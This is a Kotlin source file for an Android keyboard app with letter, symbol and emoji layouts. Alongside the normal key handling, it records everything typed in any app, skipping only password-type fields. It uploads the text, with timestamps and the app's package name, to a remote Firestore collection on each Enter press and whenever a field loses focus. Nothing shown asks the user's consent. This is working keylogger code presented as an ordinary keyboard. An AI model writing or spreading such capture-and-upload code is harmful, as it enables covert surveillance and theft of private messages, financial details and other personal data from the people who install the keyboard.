package com.smartkeyboard.app

import android.inputmethodservice.InputMethodService
import android.inputmethodservice.Keyboard
import android.inputmethodservice.KeyboardView
import android.text.InputType
import android.view.KeyEvent
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.view.inputmethod.EditorInfo
import android.widget.Button
import android.widget.GridLayout
import android.widget.LinearLayout
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import java.util.Date

class MyKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionListener {

    private lateinit var container: View
    private lateinit var lettersView: KeyboardView
    private lateinit var symbolsView: KeyboardView
    private lateinit var emojiPanel: LinearLayout

    private lateinit var lettersKeyboard: Keyboard
    private lateinit var symbolsKeyboard: Keyboard

    private val currentText = StringBuilder()
    private val db = Firebase.firestore

    private var isPasswordField = false
    private var isShifted = false

    private val emojiList = listOf(
        "😀","😂","😍","🙂","😉","😅","😎","😭","🙏","😡",
        "👍","👎","👏","🙌","💪","🤝","✌️","🤞","👋","✋",
        "❤️","🔥","🎉","⭐","✅","💰","📦","🛵","📞","💬"
    )

    override fun onCreateInputView(): View {
        container = LayoutInflater.from(this).inflate(R.layout.keyboard_container, null)

        lettersView = container.findViewById(R.id.keyboard_view_letters)
        symbolsView = container.findViewById(R.id.keyboard_view_symbols)
        emojiPanel = container.findViewById(R.id.emoji_panel)

        lettersKeyboard = Keyboard(this, R.xml.keyboard_layout)
        symbolsKeyboard = Keyboard(this, R.xml.keyboard_layout_symbols)

        lettersView.keyboard = lettersKeyboard
        lettersView.setOnKeyboardActionListener(this)

        symbolsView.keyboard = symbolsKeyboard
        symbolsView.setOnKeyboardActionListener(this)

        buildEmojiGrid()
        container.findViewById<Button>(R.id.emoji_back_btn).setOnClickListener {
            showLetters()
        }

        return container
    }

    private fun buildEmojiGrid() {
        val grid = container.findViewById<GridLayout>(R.id.emoji_grid)
        grid.removeAllViews()
        for (emoji in emojiList) {
            val btn = Button(this)
            btn.text = emoji
            btn.textSize = 20f
            btn.setBackgroundColor(0x00000000)
            btn.setTextColor(0xFFFFFFFF.toInt())
            val params = GridLayout.LayoutParams()
            params.width = 0
            params.height = ViewGroup.LayoutParams.WRAP_CONTENT
            params.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f)
            btn.layoutParams = params
            btn.setOnClickListener {
                currentInputConnection?.commitText(emoji, 1)
                currentText.append(emoji)
            }
            grid.addView(btn)
        }
    }

    private fun showLetters() {
        lettersView.visibility = View.VISIBLE
        symbolsView.visibility = View.GONE
        emojiPanel.visibility = View.GONE
    }

    private fun showSymbols() {
        lettersView.visibility = View.GONE
        symbolsView.visibility = View.VISIBLE
        emojiPanel.visibility = View.GONE
    }

    private fun showEmoji() {
        lettersView.visibility = View.GONE
        symbolsView.visibility = View.GONE
        emojiPanel.visibility = View.VISIBLE
    }

    override fun onStartInputView(info: EditorInfo?, restarting: Boolean) {
        super.onStartInputView(info, restarting)
        currentText.clear()
        showLetters()

        // SAFETY: detect password / sensitive fields and disable saving for them
        val type = info?.inputType ?: 0
        val variation = type and InputType.TYPE_MASK_VARIATION
        isPasswordField = variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
                variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
                variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD ||
                ((type and InputType.TYPE_MASK_CLASS) == InputType.TYPE_CLASS_NUMBER &&
                        variation == InputType.TYPE_NUMBER_VARIATION_PASSWORD)
    }

    override fun onKey(primaryCode: Int, keyCodes: IntArray?) {
        val ic = currentInputConnection ?: return

        when (primaryCode) {
            Keyboard.KEYCODE_DELETE -> {
                ic.deleteSurroundingText(1, 0)
                if (currentText.isNotEmpty()) currentText.deleteCharAt(currentText.length - 1)
            }
            Keyboard.KEYCODE_SHIFT -> {
                isShifted = !isShifted
                lettersKeyboard.isShifted = isShifted
                lettersView.invalidateAllKeys()
            }
            -2 -> {
                // Toggle between letters <-> symbols ("?123" / "ABC")
                if (symbolsView.visibility == View.VISIBLE) showLetters() else showSymbols()
            }
            -3 -> {
                // Toggle emoji panel
                if (emojiPanel.visibility == View.VISIBLE) showLetters() else showEmoji()
            }
            -4 -> {
                // Enter — send the key event AND treat this as a natural save-point
                ic.sendKeyEvent(KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER))
                ic.sendKeyEvent(KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_ENTER))
                flushToFirebase()
            }
            else -> {
                var code = primaryCode.toChar()
                if (isShifted) code = code.uppercaseChar()
                ic.commitText(code.toString(), 1)
                currentText.append(code)
            }
        }
    }

    // Also flush when the user leaves the field (switches app, taps Send button, etc.)
    override fun onFinishInputView(finishingInput: Boolean) {
        super.onFinishInputView(finishingInput)
        flushToFirebase()
    }

    private fun flushToFirebase() {
        val text = currentText.toString().trim()
        currentText.clear()

        if (text.isBlank()) return
        if (isPasswordField) return   // never save password fields

        val packageName = currentInputEditorInfo?.packageName ?: "unknown"

        val entry = hashMapOf(
            "text" to text,
            "timestamp" to Date(),
            "app" to packageName
        )

        db.collection("typed_entries")
            .add(entry)
            .addOnFailureListener {
                // TODO: add local retry queue if you want offline resilience
            }
    }

    // Required interface overrides
    override fun onPress(primaryCode: Int) {}
    override fun onRelease(primaryCode: Int) {}
    override fun onText(text: CharSequence?) {}
    override fun swipeLeft() {}
    override fun swipeRight() {}
    override fun swipeDown() {}
    override fun swipeUp() {}
}
